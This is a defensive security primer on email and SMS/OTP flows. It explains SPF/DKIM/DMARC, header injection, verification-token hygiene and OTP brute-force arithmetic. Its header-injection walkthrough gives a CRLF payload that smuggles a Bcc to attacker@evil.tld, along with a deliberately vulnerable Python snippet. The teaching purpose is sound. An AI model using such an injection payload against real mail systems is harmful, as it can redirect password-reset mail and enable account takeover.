# Email & SMS/OTP Flows — Background Primer

Optional depth layer for `../SKILL.md`. Zero-internet reading: no links required,
no tooling assumed, no prior security background assumed. This file teaches the
*why*; SKILL.md carries the checklists, regexes, sink tables, and fix recipes.

## How this class emerged

Email predates every security mechanism bolted onto it. The Simple Mail
Transfer Protocol of the early 1980s let any host claim any sender name; the
"From:" line a recipient sees has never been authenticated by the protocol
itself. For two decades that gap was absorbed by human skepticism and content
filtering. As commerce, banking, and password reset moved onto email in the
1990s and 2000s, the gap became an authentication problem: whoever can send
mail as your domain can phish your users *and intercept their recovery mail*.

The industry answered with three independent DNS-published records, built in
sequence because each alone failed: SPF (authorize which servers may send for
a domain), DKIM (cryptographically sign messages under a domain's published
key), and DMARC (tell receivers what to do when neither aligns with the visible
From domain, plus report back). None is a silver bullet; they compose, and each
has its own misconfiguration taxonomy — permissive terminators (`+all`),
lookup-budget bloat past ten queries, DMARC frozen at monitor-only forever.

Meanwhile the application layer accumulated its own class. Mail libraries let
callers pass header strings assembled by concatenation, so user-controlled
names and addresses carrying CR/LF could smuggle extra recipients ("Bcc:") or
whole new headers into outbound messages — header injection, documented since
the early 2000s. And as "prove you control this address/phone" became the
universal second factor and recovery channel, verification tokens, magic
links, and one-time codes quietly became credentials with all the hygiene
requirements of passwords — entropy, single-use, expiry, attempt caps — but
routinely implemented without them. SMS added an economics twist: every
message costs money, so flows that send on demand are fraud targets even when
the codes themselves are strong (SMS pumping against premium-rate ranges).

## Anatomy: header injection in three lines

Minimal vulnerable shape, stack-independent:

```python
name  = request.form["name"]                      # attacker-controlled
subject = f"Welcome, {name}"
mailer.send(to="victim@example.com",
            subject=subject,
            body="Your account is ready.")
```

Failure walkthrough:

1. The attacker submits `Gift%0d%0aBcc:%20attacker@evil.tld` as their display
   name (URL-decoded: CR LF then `Bcc: attacker@evil.tld`).
2. The template interpolates it into the Subject header. The wire format now
   contains a line break inside the header block — which SMTP reads as the end
   of one header and the start of another.
3. The smuggled `Bcc:` header adds the attacker's mailbox to delivery. If the
   injection continues past a blank line, everything after becomes body text,
   letting the attacker author content inside your legitimate notification.
4. Every notification using the shared pipeline — password resets included —
   can now be redirected or forged through one profile field. Nothing errors;
   the provider delivers the message happily.
5. The same primitive aimed at To/Cc fields turns any user-triggered send into
   a mass-mailing or exfiltration primitive.

A second anatomy covers OTP math, needing no injection at all: six digits give
1,000,000 possibilities; a five-minute window at 20 requests/second allows
6,000 guesses; without an attempt cap, expected success needs ~500,000 tries —
hours, not centuries. Entropy without attempt caps is decoration.

## Why naive fixes fail

- **"SPF exists, so spoofing is handled"**: SPF authenticates the envelope
  sender only, and a record ending `+all` or `?all` authorizes everyone while
  technically existing. Even perfect `-all` fails to protect when DMARC is
  absent, because nothing ties SPF's pass to the From domain users see.
- **"We'll strip `\n` only"**: CR alone splits some parsers; URL-decoded and
  double-encoded variants survive naive filters depending on where decoding
  happens. Strip both characters in both orders after final decode, or better,
  validate addresses with the language's strict parser.
- **"The library handles newlines"**: library behavior differs by version and
  transport; some silently fold, others reject, older ones pass through.
  Sanitize at your own boundary and treat library behavior as unguaranteed.
- **"`Math.random` is fine for OTPs, nobody knows the seed"**: outputs are
  predictable from a few observed values; also, codes land in logs and browser
  history regardless of generator quality if delivered via URL query strings.
- **"Long expiry is user-friendly"**: a 24-hour magic link is a week-long
  credential in practice; reset-grade hygiene (short TTL, atomic consume) is
  the floor precisely because these links bypass password knowledge entirely.
- **"Rate limiting at the HTTP layer covers OTP brute force"**: distributed
  sources and per-code vs per-account counter confusion defeat IP throttles;
  the cap must bind wrong-attempts-per-code with invalidation.
- **"DMARC `p=none` is our policy"**: monitor-only means receivers discard
  nothing; permanent monitoring without a staged ramp to quarantine/reject is
  enforcement theater.
- **"Uniform errors are a UX loss"**: distinct responses for registered vs
  unknown numbers build the enumeration oracle; uniformity is a control, not
  an inconvenience.

## Common misconceptions

1. **"DKIM-signed means legitimate."** Anyone who controls a signing key signs
   under their own domain; validity proves integrity since signing, not
   trustworthiness of the sender.
2. **"Valid SPF + valid DKIM = DMARC pass."** Only an aligned pass counts:
   SPF's checked domain or DKIM's `d=` must match the visible From domain
   (relaxed: same organizational domain). Both can pass and DMARC still fail.
3. **"SMS OTP is a strong factor."** It is possession-ish, weakened by SIM
   swap, number recycling, PSTN exposure, and pumping economics; treat it as a
   weaker factor with an upgrade path, not a control that closes gaps.
4. **"Verification emails are just UX."** They mint trust state. Predictable
   or reusable tokens convert directly into account takeover; they deserve
   reset-token-grade entropy, expiry, and consumption semantics.
5. **"Header injection is legacy PHP-only."** Any stack that builds header
   values from strings is exposed; modern SDKs move the sink, not the rule.
6. **"Bounces are the app's problem."** Providers manage reputation centrally;
   absence of app-side bounce handling is normal unless the app self-manages
   SMTP — flagging it anyway produces false positives.
7. **"Phone validation is a regex away."** Country-aware numbering rules make
   regex-only checks simultaneously too strict and too loose; maintained
   parsing libraries exist for exactly this reason.

## Modern taxonomy map

Matches the In Scope table of `../SKILL.md`; use these names when reporting.

| Class | One-line essence | Typical root cause |
|---|---|---|
| Outbound spoofing protection gaps | Missing/weak SPF, DKIM, DMARC artifacts | Rollout never finished |
| Sending-infrastructure markers | Credentials in code; user-controlled From/Reply-To | Convenience concatenation |
| Notification-content injection | CR/LF reaches header positions | Unsanitized interpolation |
| Inbound email processing | Unsigned webhooks acted on; stale MIME parsers | Verify-after-trust ordering |
| Verification & magic-link flaws | Predictable/reusable/expiring-late tokens | Reset hygiene not applied |
| Feature-gating gaps | Sensitive actions reachable pre-verification | Client-side gating only |
| OTP/SMS authentication defects | Weak RNG, no caps, enumeration oracles | Matrix properties unchecked |
| Contact-change UX traps | Old contact released before new verified; codes in URLs | Flow-order oversight |
| BEC/AiTM awareness surface | Display-name spoofing, AiTM kits, quishing, forwarding rules | Process-layer gaps |

Severity intuition: verification bypasses granting trusted status anchor High;
header injection enabling mass-Bcc of notification contents anchors High/Medium
by pipeline sensitivity; absent DMARC enforcement anchors Medium; enumeration-
only findings anchor Low standalone but escalate sharply chained with missing
OTP throttles.

## Read next

Return to `../SKILL.md` by section, in this order for a first audit pass:

1. **Mental Model** — three records plus alignment; sender/receiver split; the
   four verification-flow properties; the two SMS economic attack models.
2. **What To Check** — groups A–H from SPF/DKIM/DMARC artifacts through
   webhooks, verification flows, injection sinks, OTP matrices, and BEC notes.
3. **Where To Look** — artifact-first search order and per-stack send-call
   inventory commands.
4. **Patterns & Signatures** — signature set S1–S14, IaC record shapes, the
   lookup-budget worked example, payload cheat-sheet, OTP pacing calculator.
5. **Taint Tracing Guidance** — sources/propagators/sanitizers and the
   per-stack email sink table including webhook taint rules.
6. **Remediation** — staged SPF/DMARC rollout, per-stack sanitizers, OTP spec
   block, SMS anti-abuse bundle.

Sibling modules that own adjacent defects (hand findings over rather than
duplicating their analysis):

- `../authn-session/` — password-reset mechanics and MFA factor hierarchy.
- `../secrets-data-exposure/` — SMTP/API credential inventory and log leakage.
- `../ssrf-url-security/` — auto-link-fetcher extraction-to-fetch flows.
- `../api-security/` — GET side effects, parameter abuse, throttle depth.
- `../injection/` — non-header injection classes discovered during tracing.
- `../web-client/` — XSS framing for HTML-email rendering paths.
- `../crypto/` — CSPRNG selection rationale behind OTP/token generation.
